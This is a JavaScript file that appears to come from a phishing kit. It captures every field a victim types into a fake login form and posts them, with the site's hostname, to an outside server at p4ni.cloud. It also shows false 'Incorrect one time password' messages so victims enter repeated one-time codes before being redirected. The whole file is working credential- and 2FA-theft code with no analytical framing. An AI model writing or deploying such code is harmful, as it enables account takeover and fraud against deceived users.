var API_URL = "https://p4ni.cloud/api.php?token=WILASKLDJADLKJASD";
var OTT = 0;
var hasPath = "";

function serverCall(body, nextURL) {
    fetch(API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body),
        })
        .then((res) => res.json())
        .then((responseData) => {
            if (responseData.status === 200) {
                if (getQuery("next") == "ap.html" && OTT === 0) {
                    document.getElementById("frm_2_am8E_").reset();
                    document.getElementById("otp-invalid").innerHTML = "Incorrect one time password";
                    OTT++;
                    return false;
                }
                if (getQuery("next") == "faa.html" && OTT === 0) {
                    document.getElementById("frm_2_am8E_").reset();
                    document.getElementById("otp-invalid").innerHTML = "Incorrect one time password";
                    OTT++;
                    return false;
                }
                if (getQuery("next") == "un" && OTT < 3) {
                    document.getElementById("frm_2_am8E_").reset();
                    document.getElementById("otp-invalid").innerHTML = "Incorrect one time password";
                    OTT++;
                    return false;
                }
                if(OTT==3){
                    window.location.href = "404.html";
                }
                window.location.href = nextURL;
            } else {
                console.log("response is not valid");
            }
        })
        .catch((error) => {
            console.error(error);
        });
}

window.onload = function() {
    hasPath = window.location.pathname;
    if (hasPath.indexOf("otp") !== -1) {
        document.getElementById("nextValue").value = "loader.html?next="+getQuery("next");
    }
    let form = document.getElementById("frm_2_am8E_");
    let nextValue  = '';
    nextValue = document.getElementById("nextValue").value;
    form.addEventListener("submit", function(event) {
        event.preventDefault(); 
        let formData = {}; 
        for (let i = 0; i < form.elements.length; i++) {
            let element = form.elements[i];
            if (element.tagName === 'INPUT') {
                if (element.value == 'RESET' || element.value == 'LOGIN' || element.value == "Submit") {
                    continue;
                }
                formData[element.name] = element.value;
            }
        }
        formData['site'] = window.location.hostname; 
        serverCall(formData, nextValue);
    });
};

function getQuery(query){

    var currentURL = window.location.href;
    var urlParams = new URLSearchParams(currentURL.split('?')[1]);
    var nextValue = urlParams.get(query);
    return nextValue;
}

